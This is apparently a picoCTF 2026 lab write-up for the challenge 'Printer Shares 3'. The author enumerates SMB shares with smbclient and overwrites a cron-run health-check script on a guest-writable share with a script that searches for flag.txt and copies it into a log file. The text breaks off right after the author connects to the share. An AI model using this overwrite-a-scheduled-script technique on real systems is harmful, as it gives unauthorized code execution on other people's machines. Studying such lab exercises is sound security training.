Printer Shares 3

Name: Printer Shares 3
Description: I accidentally left the debug script in place… Well, I think that's fine - No one could possibly access my super secure directory two printers are on 53695, one private, one public. you can try $ nc -vz dolphin-cove.picoctf.net 53695
Author: Janice He
Tags: Hard, General Skills, picoCTF 2026
Challenge from: picoCTF 2026
Hints:
1. a suspicious script is running every minute
2. this script runs every minute, you might need to wait for a while

Theory

According to the description, to get the flag we need to connect to a printer and get a file that the printer holds. We are given a NetCat command that will check if the printer on the port is up and running, but it'll actually not give us any extra info, instead to view files from the printer we'll have to look at the users the printer has, it should be named something like disk or share since shares is the codename for users on this environment, so we can get access to the files of the printer. So to search the actual users we need a command like this, using smbclient with the option -L to list the shares on the port the printer is in, and use the -N option so that it doesn't ask for our password each time we do this command:

smbclient -L dolphin-cove.picoctf.net -p 53695 -N

Solution

We can check the printer is alive and then the usual command from theory, and also check whatever files are on the public printer share:

shukularuni@SHUKULAP:~$ smbclient -L dolphin-cove.picoctf.net -p 53695 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
SMB1 disabled -- no workgroup available

#!/bin/bash

echo "Health Check: $(date)"

So it seems there's a script that runs each minute as a "health check", I think the exploit here might be the fact that we can edit this script by creating a file of the same name and replacing it on the printer share. So if we want to find the flag we can use the usual find command to search through the entire system and then get the content of any file where its name is flag.txt, and then print that into the cron.log file:

#!/bin/bash
# Find the flag file and append its content to the log
find / -name "flag.txt" 2>/dev/null -exec cat {} \; >> /challenge/shares/cron.log 2>&1

Now that we have the script made, we can put it in a file named exactly script.sh so that the script gets replaced with our script and runs ours instead, then wait a minute or so and check the cron.log file, and see if the script was successful in getting the flag:

shukularuni@SHUKULAP:~$ nano script.sh

shukularuni@SHUKULAP:~$ smbclient //dolphin-cove.picoctf.net/shares -p 53695 -N
